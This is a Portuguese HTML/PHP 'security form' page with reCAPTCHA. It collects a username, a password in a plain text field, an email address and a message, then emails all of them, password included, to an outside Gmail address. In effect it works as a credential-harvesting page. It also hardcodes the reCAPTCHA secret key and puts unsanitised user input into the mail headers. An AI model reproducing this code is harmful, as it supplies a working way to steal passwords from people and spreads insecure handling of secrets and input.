<!DOCTYPE html>
<html lang="pt-br">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300&display=swap"
	rel="stylesheet">
  <link rel="stylesheet" href="style.css">
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  <title>Captcha</title>
</head>

<body>
  <div class="contact-form">
    <h1>Formulário de Segurança</h1>
    <form method="post" action="">
      <input type="text" name="name" placeholder="Usuário" required>
      <input type="text" name="senha" placeholder="Senha" required>
      <input type="email" name="email" placeholder="Seu email" required>
      <textarea name="message" placeholder="Sua mensagem" required></textarea>

      <div class="g-recaptcha" data-sitekey="6LdXUfMaAAAAAJEq0yj7nys9yqtEO21rQp9TRfsS"></div>
     
      <input type="submit" name="submit" value="Enviar mensagem" class="submit-btn">
    </form>

    <div class="status">
      <?php
        if (isset($_POST['submit']))
        {
          $User_name = $_POST['name'];
          $senha = $_POST['senha'];
          $user_email = $_POST['email'];
          $user_message = $_POST['message'];

          $email_from = 'verdeabsinto@gmail.com';
          $email_subject = "New Form Submission";
          $email_body = "Name: $User_name.\n".
                        "Senha: $senha.\n".
                        "Email: $user_email.\n".
                        "Mensagem: $user_message.\n";


          $to_email = "santoscostadaniele@gmail.com";
          $headers = "From: $email_from \r\n";
          $headers .= "Reply-To: $user_email \r\n";

          $secretKey = "6LdXUfMaAAAAALdH7MbNt6xAdkRbT6Lx9epzxObn";
          $responseKey = $_POST['g-recaptcha-response'];
          $UserIP = $_SERVER['REMOTE_ADDR'];
          $url = "https://www.google.com/recaptcha/api/siteverify?secret=$secretKey&response=$responseKey&remoteip=$UserIP";

          $response = file_get_contents($url);
          $response = json_decode($response);

          if ($response->success) {
            mail($to_email, $email_subject, $email_body, $headers);
            echo "Mensagem enviada com sucesso!";
          }
          else {
            echo "<span>Captcha Inválido, tente novamente</span>"; 
          }
        }


      ?>
    </div>
  </div>
</body>

</html>
